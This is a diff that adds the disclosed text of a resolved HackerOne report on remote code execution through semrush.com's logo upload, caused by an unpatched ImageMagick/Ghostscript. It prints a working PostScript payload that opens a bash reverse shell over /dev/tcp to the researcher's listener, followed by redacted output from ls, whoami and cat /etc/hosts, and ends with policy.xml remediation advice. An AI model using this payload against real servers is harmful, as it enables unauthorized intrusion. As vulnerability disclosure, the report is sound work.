@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "Command Injection - Generic"
 enriched: true
+body: true
 date: 2019-06-24
 submitted: 2018-08-31T12:48:47.276Z
 bounty_usd: null
@@ -25,6 +26,125 @@ title: "Remote Code Execution on www.semrush.com/my_reports on Logo upload"
 - Report: [https://hackerone.com/reports/403417](https://hackerone.com/reports/403417)
 - CWE: Command Injection - Generic
 - Submitted: 2018-08-31T12:48:47.276Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+The Logo upload in the report constructor at: https://www.semrush.com/my_reports/constructor
+
+{F340480}
+
+is passed through a not properly patched version of ImageMagick. You can use Postscript to get Ghostscript to run which in return allows to trigger arbitrary commands on the server, leading to Remote Code Execution. Tavis Ormandy has also mentioned recently that the policy.xml needs to disable EPS,PS,PDF and XPS since all these have ways to trigger Ghostscript: http://openwall.com/lists/oss-security/2018/08/21/2
+
+The following PoC-payload was used to get a reverse shell when issuing the upload:
+
+Save it as `test.jpg` and upload it as an image for the logo:
+
+```
+%!PS
+userdict /setpagedevice undef
+legal
+{ null restore } stopped { pop } if
+legal
+mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/███/8080 0>&1') currentdevice putdeviceprops
+```
+
+(`█████` is the IP of my listener)
+
+This resulted in:
+
+```
+█████████
+██████████
+ls
+███████
+██████████
+app
+████████
+██████████
+████
+████████
+██████
+███
+█████████
+████████
+██████
+█████████
+█████████
+█████
+██████████
+█████
+██████
+█████████
+███
+█████
+██████
+████
+█████
+█████████
+███████
+████████
+███
+███
+
+
+███
+whoami
+████
+███████
+██████
+```
+
+At this point I wasn't sure if this was a third party or not, so I checked two things:
+
+## `██████` to list files in the ██████ dir. It showed me:
+
+```
+█████████
+███
+████████
+████████
+███████
+█████
+████
+█████████
+████
+██████████
+```
+
+I navigated to 
+
+```
+https://www.semrush.com/my_reports/████
+https://www.semrush.com/my_reports/████████
+```
+
+And confirmed those two files exists in this directory.
+
+## `/etc/hosts`
+
+This one confirmed it by:
+
+```
+cat /etc/hosts
+127.0.0.1 localhost
+█████ ████.semrush.net ███
+████████ ███████
+```
+
+I'm certain this is a SEMrush-instance.
+
+{F340481}
+
+You should urgently make sure your policy.xml for imagemagick ONLY allows gif,jpg,png and nothing else.
+
+Regards,
+Frans
+
+## Impact
+
+#
 
 ## Timeline
 
